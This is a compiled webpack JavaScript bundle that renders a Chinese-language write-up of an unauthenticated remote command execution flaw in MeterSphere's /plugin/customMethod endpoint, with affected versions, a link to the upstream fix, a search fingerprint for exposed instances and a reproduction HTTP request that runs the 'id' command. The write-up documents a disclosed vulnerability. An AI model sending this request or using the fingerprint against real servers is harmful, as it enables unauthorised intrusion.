(window.webpackJsonp=window.webpackJsonp||[]).push([[136],{2197:function(t,s,a){t.exports=a.p+"assets/img/1641555749774-16f5fa84-eed7-4ec7-8c9d-0daf4085f543.3c31f7cf.png"},2198:function(t,s,a){t.exports=a.p+"assets/img/1641555879489-faa94a48-65aa-4eb5-b116-434b10b0895a.194033c9.png"},2199:function(t,s,a){t.exports=a.p+"assets/img/1641556024273-44267007-49eb-46c6-b0fd-237b0fad9d74.4576b8ac.png"},2200:function(t,s,a){t.exports=a.p+"assets/img/1641559411956-ce8b8be3-71db-4c31-95fa-d75a00adce85.ec7507eb.png"},3143:function(t,s,a){"use strict";a.r(s);var e=a(75),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"metersphere-custommethod-远程命令执行漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metersphere-custommethod-远程命令执行漏洞"}},[t._v("#")]),t._v(" MeterSphere customMethod 远程命令执行漏洞")]),t._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),e("p",[t._v("2022年1月5日，知道创宇404积极防御实验团队发现了MeterSphere开源持续测试平台的一处漏洞，并向MeterSphere研发团队进行了反馈。通过该漏洞攻击者可以在未授权的情况下执行远程代码，建议MeterSphere平台用户，尤其是可通过公网访问的用户尽快进行升级修复")]),t._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("MeterSphere v1.13.0 - v1.16.3")]),e("br"),t._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v('app="MeterSphere"')]),e("br"),t._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),e("p",[t._v("登录页面")]),t._v(" "),e("p",[e("img",{attrs:{src:a(2197),alt:"img"}})]),t._v(" "),e("p",[t._v("根据官方的修复可以看到目前版本的修复版本为删除代码片段")]),t._v(" "),e("p",[t._v('filterChainDefinitionMap.put("/plugin/**", "anon");')]),t._v(" "),e("div",{staticClass:"language-go line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-go"}},[e("code",[t._v("https"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("github"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("metersphere"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("metersphere"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pull"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("9140")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("files\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(2198),alt:"img"}})]),t._v(" "),e("p",[t._v("查看文件 "),e("strong",[t._v("/backend/src/main/java/io/metersphere/controller/PluginController.java")])]),t._v(" "),e("p",[e("img",{attrs:{src:a(2199),alt:"img"}})]),t._v(" "),e("p",[t._v("发送请求包")]),t._v(" "),e("div",{staticClass:"language-go line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-go"}},[e("code",[t._v("POST "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("plugin"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("customMethod\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"entry"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Evil"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"request"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"id"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br")])]),e("p",[e("img",{attrs:{src:a(2200),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);